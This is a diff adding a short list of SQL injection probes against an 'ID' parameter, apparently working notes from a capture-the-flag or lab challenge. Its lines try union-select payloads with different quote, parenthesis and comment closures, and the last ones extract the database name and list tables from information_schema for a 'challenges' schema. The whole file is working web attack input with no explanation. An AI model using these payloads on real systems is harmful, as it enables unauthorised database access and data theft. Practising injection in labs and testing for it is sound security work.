@@ -1,0 +1,13 @@
+ID:1
+ID:-1 union select 1,2,3 -- 
+ID:-1 union select 1,2,3 #
+ID:-1 union select 1,2,3
+ID:-1) union select 1,2,3
+ID:-1) union select 1,2,3 -- 
+ID:1
+ID:1'
+ID:1' union select database()#
+ID:0' union select 1,2,database()#
+ID:0'
+ID:0"
+ID:0) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='challenges' -- 
